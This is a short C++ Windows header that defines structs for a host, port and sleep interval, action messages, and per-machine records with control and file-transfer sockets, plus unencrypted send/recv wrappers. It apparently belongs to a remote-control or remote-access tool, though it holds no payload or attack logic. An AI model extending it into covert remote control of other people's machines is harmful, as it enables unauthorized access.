#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Winmm.lib")
#include<winsock2.h>
#include<Windows.h>
#include<stdio.h>
#include<iostream>
#include<shlwapi.h>

using namespace std;
//#define _WINSOCK_DEPRECATED_NO_WARNINGS 

typedef struct _SettingDataStruct {
	char host[100];
	DWORD dwPort;
	DWORD dwSleepTime;
}SettingDataStruct, *pSettingDataStruct;

typedef struct _ActionDataStruct {
	char cAction[50];
	char cMessage[50];
}ActionDataStruct, *pActionDataStruct;

typedef struct _MachineDataStruct {
	SOCKET socket;
	SOCKET socketControl;
	SOCKET socketFile;
	DWORD dwFlagControl;
	DWORD dwFlagFile;
	DWORD dwActive;
	char cRemoteIP[100];
	char cComputerName[100];
	char cUploadFile[100];
	char cRemark[0x100];
}MachineDataStruct, *pMachineDataStruct;

int sendData(SOCKET s, char* buf, DWORD len) {
	// add some encrypt
	return send(s, buf, len, 0);
}

int recvData(SOCKET s, char* buf, DWORD len) {
	// add some decrypt
	return recv(s, buf, len, 0);
}
